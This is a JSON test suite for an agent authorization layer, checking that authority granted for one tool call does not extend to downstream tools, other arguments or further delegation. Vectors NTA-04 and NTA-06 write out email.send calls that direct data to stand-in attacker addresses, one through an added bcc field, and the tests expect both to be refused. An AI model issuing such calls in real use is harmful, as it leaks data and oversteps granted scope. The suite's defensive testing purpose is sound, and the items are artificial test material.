{
  "suite": "non-transitivity-of-authority-v1",
  "description": "NTA-1: authorization of one capability does not authorize any capability reachable through it. Each vector is a step programme over a fixed world and a normalized expected outcome. Implementation-agnostic: nothing here names a REMORA type.",
  "world": {
    "tenant": "acme",
    "environment": "prod",
    "principal": "agent-42",
    "tools": {
      "wrapper": "report.generate",
      "downstream": "email.send",
      "read": "database.read",
      "unrelated": "shell.execute"
    },
    "tasks": {
      "monthly_report": ["report.generate", "database.read", "email.send"],
      "read_only": ["report.generate", "database.read"]
    },
    "constraints": {
      "email.send": {
        "allowed_fields": ["to", "subject", "body"],
        "conditions": [{"argument": "to", "in": ["ops@acme", "user@acme"]}]
      }
    }
  },
  "outcome_classes": {
    "EXECUTED": "the call ran",
    "REFUSED_BINDING": "the authority presented was issued for a different call (tool or arguments)",
    "REFUSED_NOT_AUTHORIZED": "the capability is outside the presenting principal's authority",
    "REFUSED_ARGUMENT_SCOPE": "the capability is authorized, these arguments are not",
    "REFUSED_REVOKED": "the authority, or one it was derived from, was revoked",
    "DELEGATED": "a derived authority was issued",
    "DELEGATION_DENIED": "a derived authority was refused"
  },
  "vectors": [
    {"id": "NTA-01", "form": "reachability", "title": "authority for the wrapper does not dispatch the downstream capability",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "authorize", "as": "L", "set": "P", "tool": "report.generate", "arguments": {"month": "2026-09"}},
               {"op": "dispatch", "authority": "L", "set": "P", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}}],
     "expect": "REFUSED_BINDING"},
    {"id": "NTA-02", "form": "reachability", "title": "a wrapper cannot obtain a downstream capability its caller lacks (confused deputy)",
     "steps": [{"op": "resolve", "as": "P", "task": "read_only"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]}],
     "expect": "DELEGATION_DENIED"},
    {"id": "NTA-03", "form": "reachability", "title": "a capability outside the principal's set is refused even with a call-bound authority",
     "steps": [{"op": "resolve", "as": "P", "task": "read_only"},
               {"op": "authorize", "as": "L", "set": "P", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "P", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}}],
     "expect": "REFUSED_NOT_AUTHORIZED"},
    {"id": "NTA-04", "form": "argument", "title": "an authorized downstream capability with out-of-scope arguments is refused",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]},
               {"op": "authorize", "as": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "attacker@evil", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "attacker@evil", "body": "r"}}],
     "expect": "REFUSED_ARGUMENT_SCOPE"},
    {"id": "NTA-05", "form": "argument", "title": "authority for B(X) does not dispatch B(Y)",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "authorize", "as": "L", "set": "P", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "P", "tool": "email.send", "arguments": {"to": "ops@acme", "body": "r"}}],
     "expect": "REFUSED_BINDING"},
    {"id": "NTA-06", "form": "argument", "title": "a delegation can narrow fields but never add one",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"],
                "extra_constraints": {"email.send": {"allowed_fields": ["to", "body", "bcc"]}}},
               {"op": "authorize", "as": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r", "bcc": "x@evil"}},
               {"op": "dispatch", "authority": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r", "bcc": "x@evil"}}],
     "expect": "REFUSED_ARGUMENT_SCOPE"},
    {"id": "NTA-07", "form": "delegation", "title": "a delegated authority cannot be delegated again by default",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]},
               {"op": "delegate", "as": "G", "from": "C", "delegatee": "email.worker", "tools": ["email.send"]}],
     "expect": "DELEGATION_DENIED"},
    {"id": "NTA-08", "form": "delegation", "title": "re-delegation is possible only where the link opted in, and stays a subset",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"], "transitive": true},
               {"op": "delegate", "as": "G", "from": "C", "delegatee": "email.worker", "tools": ["email.send"]}],
     "expect": "DELEGATED"},
    {"id": "NTA-09", "form": "delegation", "title": "a re-delegation cannot add a capability the link above lacked",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"], "transitive": true},
               {"op": "delegate", "as": "G", "from": "C", "delegatee": "email.worker", "tools": ["email.send", "database.read"]}],
     "expect": "DELEGATION_DENIED"},
    {"id": "NTA-10", "form": "delegation", "title": "delegation depth is bounded even when every link opts in",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C1", "from": "P", "delegatee": "d1", "tools": ["email.send"], "transitive": true},
               {"op": "delegate", "as": "C2", "from": "C1", "delegatee": "d2", "tools": ["email.send"], "transitive": true},
               {"op": "delegate", "as": "C3", "from": "C2", "delegatee": "d3", "tools": ["email.send"], "transitive": true},
               {"op": "delegate", "as": "C4", "from": "C3", "delegatee": "d4", "tools": ["email.send"], "transitive": true}],
     "expect": "DELEGATION_DENIED"},
    {"id": "NTA-11", "form": "delegation", "title": "a derived authority is bound to its delegatee",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]},
               {"op": "authorize", "as": "L", "set": "C", "actor": "other.tool", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "C", "actor": "other.tool", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}}],
     "expect": "REFUSED_NOT_AUTHORIZED"},
    {"id": "NTA-12", "form": "delegation", "title": "revoking the parent revokes what was derived from it",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]},
               {"op": "revoke", "set": "P"},
               {"op": "authorize", "as": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}}],
     "expect": "REFUSED_REVOKED"},
    {"id": "NTA-13", "form": "baseline", "title": "an explicitly delegated, in-scope downstream call executes",
     "steps": [{"op": "resolve", "as": "P", "task": "monthly_report"},
               {"op": "delegate", "as": "C", "from": "P", "delegatee": "report.generate", "tools": ["email.send"]},
               {"op": "authorize", "as": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}},
               {"op": "dispatch", "authority": "L", "set": "C", "actor": "report.generate", "tool": "email.send", "arguments": {"to": "user@acme", "body": "r"}}],
     "expect": "EXECUTED"}
  ]
}
